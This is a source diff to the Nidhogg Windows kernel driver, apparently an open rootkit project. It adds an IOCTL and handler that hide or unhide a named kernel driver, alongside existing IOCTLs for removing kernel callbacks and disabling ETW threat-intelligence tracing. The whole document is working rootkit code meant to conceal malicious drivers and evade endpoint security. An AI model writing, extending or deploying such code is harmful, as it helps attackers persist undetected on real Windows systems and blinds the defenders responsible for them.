@@ -37,6 +37,8 @@
 #define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_NIDHOGG_HIDE_UNHIDE_DRIVER CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -810,6 +812,37 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		len += sizeof(HiddenModuleInformation);
+		break;
+	}
+
+	case IOCTL_NIDHOGG_HIDE_UNHIDE_DRIVER:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(HiddenDriverInformation) != 0) {
+			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (HiddenDriverInformation*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (!data->DriverName) {
+			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		status = NidhoggMemoryUtils->HideDriver(data);
+
+		if (NT_SUCCESS(status)) {
+			auto prevIrql = KeGetCurrentIrql();
+			KeLowerIrql(PASSIVE_LEVEL);
+			KdPrint((DRIVER_PREFIX "Hid driver %ws.\n", (*data).DriverName));
+			KeRaiseIrql(prevIrql, &prevIrql);
+		}
+
+		len += sizeof(HiddenDriverInformation);
 		break;
 	}
 
